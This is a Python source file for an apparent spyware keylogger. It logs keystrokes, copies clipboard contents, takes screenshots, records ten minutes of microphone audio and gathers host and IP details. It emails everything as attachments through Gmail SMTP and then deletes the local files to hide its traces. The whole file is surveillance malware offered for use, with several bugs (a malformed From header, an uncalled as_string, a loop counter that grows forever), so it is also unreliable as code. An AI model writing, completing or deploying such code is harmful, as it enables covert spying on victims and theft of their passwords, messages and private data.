import mimetypes
import os
import platform
import time
import pyscreenshot as ImageGrab
import smtplib
import socket
import sounddevice as sd
import win32clipboard

from email.message import EmailMessage
from pynput import keyboard, Listener
from scipy.io.wavfile import write


pathToDir = ''    # path to the directory containing the files with the collected data

audio_information = 'audio.wav'
computer_information = 'system.txt'
clipboard_information = 'clipobard.txt'
screenshot_information = 'screenshot.png'
keys_information = 'key_log.txt'

attachments = []

server = {
    'name': 'smtp.gmail.com',   # SMTP server you want to connect to
    'port': 587                 # port you want to connect to
}

email = {
    'address': '',      # your email address
    'password': '',     # your email password
    'contacts': []      # contacts to whom you want to send the email
}

# Time Controls
timeIteration = 15
totalIterations = 2


def send_email():
    subject = 'Log File'
    body = 'Body of the email'

    msg = EmailMessage()
    msg['Subject'] = subject
    msg['From'] = email
    msg['To'] = ', '.join(email.get('contacts'))
    msg.set_content(body)

    if len(attachments) != 0:
        for file in attachments:
            path = file
            fileName = os.path.basename(path)
            mime_type, _ = mimetypes.guess_type(path)
            mime_type, mime_subtype = mime_type.split('/', 1)

            with open(path, 'rb') as p:
                msg.add_attachment(p.read(), maintype=mime_type, subtype=mime_subtype, filename=fileName)

    with smtplib.SMTP_SSL(server.get('name'), server.get('port')) as smtp:
        smtp.login(email.get('address'), email.get('password'))
        smtp.send_message(msg.as_string)
        smtp.quit()


def get_computer_information(fileName: str):
    pathToFile = os.path.join(os.path.abspath(pathToDir), fileName)

    with open(pathToFile, "a") as f:
        hostname = socket.gethostname()
        IPAddr = socket.gethostbyname(hostname)

        f.write("Processor: " + (platform.processor() + "\n"))
        f.write("System: " + platform.system() + " " + platform.version() + "\n")
        f.write("Machine: " + platform.machine() + "\n")
        f.write("Hostname: " + hostname + "\n")
        f.write("IP Address: " + IPAddr + "\n")
    
    attachments.append(pathToFile)


get_computer_information(computer_information)


def get_clipboard_content(fileName: str):
    pathToFile = os.path.join(os.path.abspath(pathToDir), fileName)

    with open(pathToFile, "a") as f:
        try:
            win32clipboard.OpenClipboard()
            data = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()
            f.write("Clipboard Data:\n" + data)
        except:
            f.write("Clipboard Data could not be copied.")
    
    attachments.append(pathToFile)


def get_schreenshot(fileName: str):
    pathToFile = os.path.join(os.path.abspath(pathToDir), fileName)

    img = ImageGrab.grab()
    img.save(pathToFile)

    attachments.append(pathToFile)


def get_audio(time_interval: int, fileName: str):
    pathToFile = os.path.join(os.path.abspath(pathToDir), fileName)

    sample_freq = 44100     # 44.1 kHz
    recording = sd.rec(int(time_interval * sample_freq), samplerate = sample_freq, channels = 2)
    sd.wait()

    write(pathToFile, sample_freq, recording)

    attachments.append(pathToFile)


get_audio(600, audio_information)

currentIteration = 0
currentTime = time.time()
stoppingTime = time.time() + timeIteration


while currentIteration < totalIterations:

    count = 0
    keys = []

    counter = 0

    def on_press(key):
        global keys, count, currentTime

        print(key)
        keys.append(key)
        count += 1
        currentTime = time.time()

        if count >= 1:
            count = 0
            write_file(keys)
            keys = []

    
    def write_file(keys):
        pathToFile = os.path.join(os.path.abspath(pathToDir), keys_information)
        
        with open(pathToFile, "a") as f:
            for key in keys:
                k = str(key).replace("'","")
                
                if k.find("space") > 0:
                    f.write('\n')
                    f.close()
                elif k.find("Key") == -1:
                    f.write(k)
                    f.close()

    
    def on_release(key):
        if key == keyboard.Key.esc:
            return False
        if currentTime > stoppingTime:
            return False


    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()
    
    if currentTime > stoppingTime:
        pathToFile = os.path.join(os.path.abspath(pathToDir), keys_information)
        
        attachments.append(pathToFile)

        with open(pathToFile, "w") as f:
            f.write(" ")

        get_schreenshot(screenshot_information)
        get_clipboard_content(clipboard_information)

        totalIterations += 1
        
        currentTime = time.time()
        stoppingTime = time.time() + timeIteration


def delete_files(files: list[str]):
    for file in files:
        pathToFile = os.path.join(os.path.abspath(pathToDir), file)
        os.remove(pathToFile)


send_email()

files = [computer_information, clipboard_information, screenshot_information, audio_information, keys_information]
delete_files(files)